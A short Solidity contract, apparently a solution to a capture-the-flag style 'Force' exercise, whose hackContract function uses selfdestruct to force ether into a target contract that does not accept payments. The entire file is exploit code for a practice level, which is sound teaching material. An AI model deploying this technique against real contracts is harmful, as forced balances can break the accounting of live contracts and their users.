// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        // cast victim address as payable
        // selfdestruct this contract and send all ether to victim
        selfdestruct(payable(contractAddress));
    }
}
